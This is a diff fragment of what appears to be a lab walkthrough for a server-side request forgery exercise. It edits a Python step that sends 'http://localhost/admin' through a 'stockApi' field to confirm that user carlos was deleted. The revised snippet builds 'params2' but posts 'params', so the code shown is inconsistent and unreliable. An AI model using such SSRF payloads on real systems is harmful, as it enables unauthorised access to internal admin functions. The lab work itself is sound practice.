@@ -55,14 +55,14 @@ def delete_user(url):
 6. Now until above the if script executed, the user would have be deleted but what if we want to check if our script worked is correct or not, hence below code. Here we make an another request to the `/admin` path and in the response the script will check for keyword `User deleted successfully`, if mentioned then it is a success, if not - unsuccess. 
 
 ```
-    # Check if user was deleted
-    admin_ssrf_payload = 'http://localhost/admin'
-    params2 = {'stockApi': admin_ssrf_payload}
-    r = requests.post(url + check_stock_path, data=params2, verify=False, proxies=proxies)
-    if 'User deleted successfully' in r.text:
+   # Now checking if it our script actually worked or not - which is here deleting the user name carlos 
+    payload2 = 'http://localhost/admin'
+    params2 = {'stockApi': payload2}
+    r = requests.post(url + check_stock_path, proxies=proxies, verify=False, data=params)
+    if "User deleted successfully" in r.text:
         print("(+) Successfully deleted Carlos user!")
     else:
-        print("(-) Exploit was unsuccessful.")
+        print("(-) Exploit was Unsuccessful.")
 ```
 
 
